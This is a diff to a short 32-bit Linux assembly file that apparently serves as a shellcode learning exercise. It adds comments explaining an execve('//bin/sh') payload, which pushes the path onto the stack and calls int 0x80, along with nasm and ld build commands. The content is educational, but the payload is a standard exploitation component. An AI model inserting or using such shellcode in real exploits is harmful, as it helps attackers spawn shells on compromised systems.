@@ -1,17 +1,29 @@
+;initial code to undestand the sys_execve
+;section .data:
+;	cmd: db "/bin/sh",0x0
+;section .text:
+;	global _start
+;	_start:
+;		mov eax,0x0b;	use sys_execve
+;		mov ebx,cmd;	first arg, file to execute
+;		mov edx,0x0;	first parameter no usage
+;		mov ecx,0x0;	second parameter no usage
+;		int 0x80;	kernel interrupt
+
 section .text:
 	global _start
 	_start:
-		push ebp
-		mov ebp,esp
-		sub esp,10
-		push 0x68732f6e
-		push 0x69622f2f
-		xor eax,eax
-		add eax,0x0b
-		mov ebx,esp
-		xor edx,edx
-		xor ecx,edx
-		int 0x80
+		push ebp		;prologo
+		mov ebp,esp		;prologo
+		sub esp,10		;reserve 10bytes on stack
+		push 0x68732f6e		;send hs/n to stack 
+		push 0x69622f2f		;send ib// to stack
+		xor eax,eax		;zero to eax
+		add eax,0x0b		;add 0x0b on eax to call sys_execve
+		mov ebx,esp		;mov //bin/sh(hs/nib//) to ebx
+		xor edx,edx		;zero to edx first arg
+		xor ecx,edx		;zero ecx second arg
+		int 0x80		;kernel interrupt
 
 ;compiler && linker
 ;nasm -f elf32 sh3llc0d3.asm && ld -o shell sh3llc0d3.o
